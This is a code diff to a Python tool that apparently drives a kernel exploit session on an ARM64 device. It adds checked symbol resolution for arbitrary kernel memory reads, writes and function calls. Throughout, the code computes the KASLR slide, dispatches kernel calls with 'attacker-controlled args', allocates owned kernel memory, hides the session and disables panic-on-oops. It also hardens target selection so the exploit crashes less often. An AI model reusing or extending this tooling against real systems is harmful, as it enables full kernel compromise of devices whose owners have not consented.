@@ -97,6 +97,14 @@ MIN_ALLOCATOR_EXPORT_BL_XREFS = {
     "__kmalloc": 100,
     "kfree": 100,
 }
+EXPORT_GROUND_TRUTH_SYMBOLS = frozenset(ALLOCATOR_EXPORT_REQUIRED)
+MIN_VERIFIED_DIRECT_BL_XREFS = 1
+KNOWN_UNSAFE_CALL_TARGETS = {
+    "kallsyms_lookup_name": (
+        "faulted/rebooted during v2a1 live validation; resolve symbols from "
+        "static evidence instead of calling this target"
+    ),
+}
 
 A64_BL_MASK = 0xFC000000
 A64_BL = 0x94000000
@@ -335,6 +343,34 @@ def resolve_link(symbols: dict[str, Symbol], name: str) -> int:
 
 
 @dataclass(frozen=True)
+class VerifiedResolution:
+    symbol: str
+    link_vaddr: int | None
+    verified: bool
+    method: str
+    evidence: dict[str, object]
+
+    def public_dict(self) -> dict[str, object]:
+        return {
+            "symbol": self.symbol,
+            "link_vaddr": f"0x{self.link_vaddr:x}" if self.link_vaddr is not None else None,
+            "verified": self.verified,
+            "method": self.method,
+            "evidence": self.evidence,
+        }
+
+
+def require_verified_resolution(resolution: VerifiedResolution, action: str) -> int:
+    if resolution.verified and resolution.link_vaddr is not None:
+        return resolution.link_vaddr
+    blocked = resolution.evidence.get("blocked_reasons", [])
+    raise ReplError(
+        f"{action} target {resolution.symbol!r} is not verified "
+        f"(method={resolution.method}, blocked={blocked})"
+    )
+
+
+@dataclass(frozen=True)
 class StaticImage:
     kernel_off: int
     data: bytes  # whole boot image bytes
@@ -388,6 +424,20 @@ def static_raw_image(image: StaticImage) -> bytes:
         start = stage_c.KERNEL_WRAPPER_RAW_OFFSET
         return kernel[start : start + size]
     return kernel
+
+
+_STATIC_RAW_CACHE: dict[tuple[int, int], bytes] = {}
+_DIRECT_BL_XREF_CACHE: dict[tuple[int, int], tuple[int, list[str]]] = {}
+_EXPORT_CANDIDATE_CACHE: dict[tuple[int, str], list[dict[str, object]]] = {}
+
+
+def cached_static_raw_image(image: StaticImage) -> bytes:
+    key = (id(image.data), image.kernel_off)
+    raw = _STATIC_RAW_CACHE.get(key)
+    if raw is None:
+        raw = static_raw_image(image)
+        _STATIC_RAW_CACHE[key] = raw
+    return raw
 
 
 def _raw_off_to_vaddr(raw_off: int) -> int:
@@ -447,6 +497,15 @@ def _count_direct_bl_xrefs(raw: bytes, target_vaddr: int) -> tuple[int, list[str
     return count, sample_sites
 
 
+def _count_direct_bl_xrefs_cached(raw: bytes, target_vaddr: int) -> tuple[int, list[str]]:
+    key = (id(raw), target_vaddr)
+    cached = _DIRECT_BL_XREF_CACHE.get(key)
+    if cached is None:
+        cached = _count_direct_bl_xrefs(raw, target_vaddr)
+        _DIRECT_BL_XREF_CACHE[key] = cached
+    return cached
+
+
 def _function_words_from_raw(raw: bytes, link_vaddr: int, byte_count: int = 0x80) -> list[int]:
     raw_off = _vaddr_to_raw_off(link_vaddr)
     if raw_off < 0 or raw_off + byte_count > len(raw):
@@ -468,7 +527,7 @@ def _recover_export_candidates(raw: bytes, symbol: str) -> list[dict[str, object
                     continue
                 words = _function_words_from_raw(raw, value)
                 deref = _first_precall_x0_deref(words)
-                bl_count, sample_sites = _count_direct_bl_xrefs(raw, value)
+                bl_count, sample_sites = _count_direct_bl_xrefs_cached(raw, value)
                 candidates.append({
                     "symbol": symbol,
                     "link_vaddr": f"0x{value:x}",
@@ -494,6 +553,15 @@ def _recover_export_candidates(raw: bytes, symbol: str) -> list[dict[str, object
     return candidates
 
 
+def _recover_export_candidates_cached(raw: bytes, symbol: str) -> list[dict[str, object]]:
+    key = (id(raw), symbol)
+    cached = _EXPORT_CANDIDATE_CACHE.get(key)
+    if cached is None:
+        cached = _recover_export_candidates(raw, symbol)
+        _EXPORT_CANDIDATE_CACHE[key] = cached
+    return cached
+
+
 def recover_allocator_export_addresses(
     symbols: dict[str, Symbol],
     image: StaticImage,
@@ -501,13 +569,13 @@ def recover_allocator_export_addresses(
     required: tuple[str, ...] = ALLOCATOR_EXPORT_REQUIRED,
     optional: tuple[str, ...] = ALLOCATOR_EXPORT_OPTIONAL,
 ) -> dict[str, object]:
-    raw = static_raw_image(image)
+    raw = cached_static_raw_image(image)
     rows: list[dict[str, object]] = []
     recovered: dict[str, int] = {}
     ok = True
 
     for symbol in (*required, *optional):
-        candidates = _recover_export_candidates(raw, symbol)
+        candidates = _recover_export_candidates_cached(raw, symbol)
         selected = candidates[0] if candidates else None
         map_symbol = symbols.get(symbol)
         map_link = map_symbol.vaddr if map_symbol else None
@@ -785,6 +853,113 @@ def _scan_function_shape(symbols: dict[str, Symbol],
     }
 
 
+def resolve_verified(symbols: dict[str, Symbol],
+                     image: StaticImage,
+                     name: str,
+                     *,
+                     purpose: str = "call") -> VerifiedResolution:
+    """Resolve a symbol for a potentially dangerous target and attach proof.
+
+    System.map is intentionally treated as untrusted for executable/write
+    targets. The only automatic map-bypass ground truth currently accepted is
+    the v2a2R' export recovery for symbols whose recovered addresses were
+    independently live-proven. Other call/poke targets must pass static
+    signature sanity at their map address. Read-only peeks may still use the
+    map, but they are surfaced as unverified.
+    """
+    if purpose not in ("call", "poke", "peek"):
+        raise ValueError(f"unknown resolution purpose: {purpose}")
+
+    map_symbol = symbols.get(name)
+    map_link = map_symbol.vaddr if map_symbol is not None else None
+    blocked: list[str] = []
+    evidence: dict[str, object] = {
+        "purpose": purpose,
+        "map_link_vaddr": f"0x{map_link:x}" if map_link is not None else None,
+        "blocked_reasons": blocked,
+    }
+
+    if map_link is None:
+        blocked.append("missing-symbol-in-System.map")
+        return VerifiedResolution(name, None, False, "missing", evidence)
+
+    if purpose == "peek":
+        evidence["note"] = "read-only peek may use System.map but is not a verified call/poke target"
+        return VerifiedResolution(name, map_link, False, "System.map-read-only-unverified", evidence)
+
+    unsafe_reason = KNOWN_UNSAFE_CALL_TARGETS.get(name)
+    if unsafe_reason:
+        blocked.append(f"known-unsafe-live-call:{unsafe_reason}")
+        return VerifiedResolution(name, map_link, False, "blocked-known-unsafe", evidence)
+
+    raw = cached_static_raw_image(image)
+    export_candidates = _recover_export_candidates_cached(raw, name)
+    passing_exports: list[dict[str, object]] = []
+    for candidate in export_candidates:
+        bl_count = int(candidate["direct_bl_xref_count"])
+        min_xrefs = MIN_ALLOCATOR_EXPORT_BL_XREFS.get(name, MIN_VERIFIED_DIRECT_BL_XREFS)
+        if (
+            candidate.get("jopp_entry")
+            and candidate.get("precall_x0_deref") is None
+            and bl_count >= min_xrefs
+        ):
+            passing_exports.append(candidate)
+
+    evidence["export_candidate_count"] = len(export_candidates)
+    evidence["export_passing_candidate_count"] = len(passing_exports)
+    if export_candidates:
+        evidence["export_candidate_sample"] = export_candidates[:3]
+
+    if len(passing_exports) == 1:
+        selected = passing_exports[0]
+        selected_link = int(str(selected["link_vaddr"]), 16)
+        evidence["export_selected_link_vaddr"] = selected["link_vaddr"]
+        evidence["export_selected_direct_bl_xref_count"] = selected["direct_bl_xref_count"]
+        evidence["map_agrees_with_export"] = selected_link == map_link
+        if name in EXPORT_GROUND_TRUTH_SYMBOLS or selected_link == map_link:
+            return VerifiedResolution(name, selected_link, True, "export-recovery", evidence)
+        evidence["export_recovery_rejected_reason"] = (
+            "disagrees-with-map-and-symbol-not-ground-truth-allowlisted"
+        )
+    elif len(passing_exports) > 1:
+        evidence["export_recovery_rejected_reason"] = "ambiguous-export-recovery-candidates"
+
+    try:
+        magic = image.u32_at_vaddr(map_link - 4)
+        shape = _scan_function_shape(symbols, image, map_link)
+        bl_count, sample_sites = _count_direct_bl_xrefs_cached(raw, map_link)
+    except Exception as exc:  # noqa: BLE001 - malformed map/image pairing is unverified
+        blocked.append(f"static-verification-failed:{exc}")
+        return VerifiedResolution(name, map_link, False, "unverified", evidence)
+
+    evidence.update({
+        "map_entry_minus_4": f"0x{magic:08x}",
+        "map_jopp_entry": magic == JOPP_MAGIC,
+        "map_direct_bl_xref_count": bl_count,
+        "map_direct_bl_xref_sample_sites": sample_sites,
+        "map_shape": shape,
+    })
+    if magic != JOPP_MAGIC:
+        blocked.append("map-target-not-jopp-entry")
+    deref = shape["precall_x0_deref"]
+    if deref:
+        assert isinstance(deref, dict)
+        blocked.append(
+            "map-target-precall-x0-deref:"
+            f"+0x{deref['offset']:x}/imm=0x{deref['imm']:x}/word=0x{deref['word']:08x}"
+        )
+    if bl_count < MIN_VERIFIED_DIRECT_BL_XREFS:
+        blocked.append(f"map-target-low-direct-bl-xrefs:{bl_count}<{MIN_VERIFIED_DIRECT_BL_XREFS}")
+    if shape["first_bl"] is None:
+        blocked.append("map-target-no-helper-call-before-return-or-scan-limit")
+    if shape["zero_return_before_first_ret_or_bl"]:
+        blocked.append("map-target-zero-return-pattern-before-first-ret-or-bl")
+
+    if blocked:
+        return VerifiedResolution(name, map_link, False, "unverified", evidence)
+    return VerifiedResolution(name, map_link, True, "disasm-signature+xref+map", evidence)
+
+
 def assert_no_precall_x0_pointer_deref(image: StaticImage, link_vaddr: int,
                                        name: str) -> None:
     """Reject scalar-call candidates whose entry dereferences x0 before the
@@ -897,6 +1072,12 @@ def run_selftest(session: ReplSession,
                  peek_symbols: tuple[str, ...],
                  call_symbol: str = "printk") -> dict[str, object]:
     checks: list[dict[str, object]] = []
+    peek_resolutions = {
+        name: resolve_verified(symbols, image, name, purpose="peek")
+        for name in peek_symbols
+    }
+    call_resolution = resolve_verified(symbols, image, call_symbol, purpose="call")
+    call_link = require_verified_resolution(call_resolution, "call")
     session.hide()
     session.set_panic_on_oops(0)
     try:
@@ -907,7 +1088,10 @@ def run_selftest(session: ReplSession,
 
         # 1) named peek vs static image ground truth -----------------------
         for name in peek_symbols:
-            link = resolve_link(symbols, name)
+            peek_resolution = peek_resolutions[name]
+            if peek_resolution.link_vaddr is None:
+                raise ReplError(f"peek symbol {name!r} did not resolve")
+            link = peek_resolution.link_vaddr
             want = image.u64_at_vaddr(link)
             got = session.peek_runtime(link + slide, 8)
             ok = got == want
@@ -916,6 +1100,8 @@ def run_selftest(session: ReplSession,
                 "symbol": name,
                 "ok": ok,
                 "match_static_qword": ok,
+                "resolution_verified": peek_resolution.verified,
+                "resolution_method": peek_resolution.method,
             })
             if not ok:
                 raise ReplError(
@@ -928,8 +1114,6 @@ def run_selftest(session: ReplSession,
         #    name -> map -> slide -> call dispatch with attacker-controlled args.
         #    (printk is the call target proven safe by v1-repl; kallsyms_lookup_name
         #    is deliberately *not* called here -- it faulted live.)
-        call_link = resolve_link(symbols, call_symbol)
-        assert_jopp_entry(image, call_link, call_symbol)
         format_runtime = (FORMAT_LINK_VADDR + slide) & MASK64
         values = session.call_runtime_values(
             call_link + slide,
@@ -941,6 +1125,8 @@ def run_selftest(session: ReplSession,
             "call_symbol": call_symbol,
             "ok": sentinel_echoed,
             "sentinel_echoed": sentinel_echoed,
+            "resolution_verified": call_resolution.verified,
+            "resolution_method": call_resolution.method,
         })
         if not sentinel_echoed:
             raise ReplError(
@@ -955,6 +1141,7 @@ def run_selftest(session: ReplSession,
         "ok": passed,
         "peek_symbols": list(peek_symbols),
         "call_symbol": call_symbol,
+        "call_resolution": call_resolution.public_dict(),
         "checks": checks,
         # slide deliberately omitted from the public summary
     }
@@ -970,7 +1157,7 @@ def run_poke_roundtrip(session: ReplSession,
                        include_width32: bool = True,
                        check_allocator_abi: bool = True,
                        allocator_links: dict[str, int] | None = None,
-                       allocator_source: str = "System.map") -> tuple[dict[str, object], dict[str, object]]:
+                       allocator_source: str = "verified-resolution") -> tuple[dict[str, object], dict[str, object]]:
     """v2a2 proof: allocate owned kernel memory, poke it, peek it, free it.
 
     Returns `(public_summary, private_evidence)`. The public half deliberately
@@ -992,10 +1179,17 @@ def run_poke_roundtrip(session: ReplSession,
         raise ReplError("GFP_KERNEL derivation returned no value")
 
     allocator_links = allocator_links or {}
-    kmalloc_link = allocator_links.get("__kmalloc", resolve_link(symbols, "__kmalloc"))
-    kfree_link = allocator_links.get("kfree", resolve_link(symbols, "kfree"))
-    assert_jopp_entry(image, kmalloc_link, "__kmalloc")
-    assert_jopp_entry(image, kfree_link, "kfree")
+    kmalloc_resolution = resolve_verified(symbols, image, "__kmalloc", purpose="call")
+    kfree_resolution = resolve_verified(symbols, image, "kfree", purpose="call")
+    kmalloc_link = require_verified_resolution(kmalloc_resolution, "allocator call")
+    kfree_link = require_verified_resolution(kfree_resolution, "allocator free call")
+    for symbol_name, verified_link in (("__kmalloc", kmalloc_link), ("kfree", kfree_link)):
+        override_link = allocator_links.get(symbol_name)
+        if override_link is not None and override_link != verified_link:
+            raise ReplError(
+                f"allocator override for {symbol_name} does not match verified resolution "
+                f"(override=0x{override_link:x}, verified=0x{verified_link:x})"
+            )
     if check_allocator_abi:
         assert_no_precall_x0_pointer_deref(image, kmalloc_link, "__kmalloc")
 
@@ -1086,6 +1280,10 @@ def run_poke_roundtrip(session: ReplSession,
             "__kmalloc": f"0x{kmalloc_link:x}",
             "kfree": f"0x{kfree_link:x}",
         },
+        "allocator_resolutions": {
+            "__kmalloc": kmalloc_resolution.public_dict(),
+            "kfree": kfree_resolution.public_dict(),
+        },
         "raw_runtime_values_redacted": True,
         "checks": checks,
     }
@@ -1149,8 +1347,9 @@ def cmd_selftest(args: argparse.Namespace) -> int:
 
 def cmd_resolve(args: argparse.Namespace) -> int:
     symbols = load_system_map(args.map)
-    link = resolve_link(symbols, args.symbol)
-    print(json.dumps({"symbol": args.symbol, "link_vaddr": f"0x{link:x}"}, indent=2))
+    image = load_static_image(args.image)
+    resolution = resolve_verified(symbols, image, args.symbol, purpose=args.purpose)
+    print(json.dumps(resolution.public_dict(), indent=2, sort_keys=True))
     return 0
 
 
@@ -1158,7 +1357,10 @@ def cmd_peek(args: argparse.Namespace) -> int:
     symbols = load_system_map(args.map)
     image = load_static_image(args.image)
     session = make_session(args)
-    link = resolve_link(symbols, args.symbol)
+    resolution = resolve_verified(symbols, image, args.symbol, purpose="peek")
+    if resolution.link_vaddr is None:
+        raise ReplError(f"peek symbol {args.symbol!r} did not resolve")
+    link = resolution.link_vaddr
     session.hide()
     session.set_panic_on_oops(0)
     try:
@@ -1170,6 +1372,8 @@ def cmd_peek(args: argparse.Namespace) -> int:
     summary = {
         "symbol": args.symbol,
         "len": args.len,
+        "resolution_verified": resolution.verified,
+        "resolution_method": resolution.method,
         "matches_static_qword": (want is not None and got == want),
     }
     write_evidence(args, {**summary, "_raw_qword": f"0x{got:x}"})
@@ -1245,6 +1449,9 @@ def main(argv: list[str] | None = None) -> int:
 
     p_res = sub.add_parser("resolve", help="print link vaddr for a symbol (host-only)")
     p_res.add_argument("--map", type=Path, required=True)
+    p_res.add_argument("--image", type=Path, default=REPO_ROOT / DEFAULT_IMAGE,
+                       help="static boot image matching the map; required for verification evidence")
+    p_res.add_argument("--purpose", choices=("call", "poke", "peek"), default="call")
     p_res.add_argument("symbol")
     p_res.set_defaults(func=cmd_resolve)
 
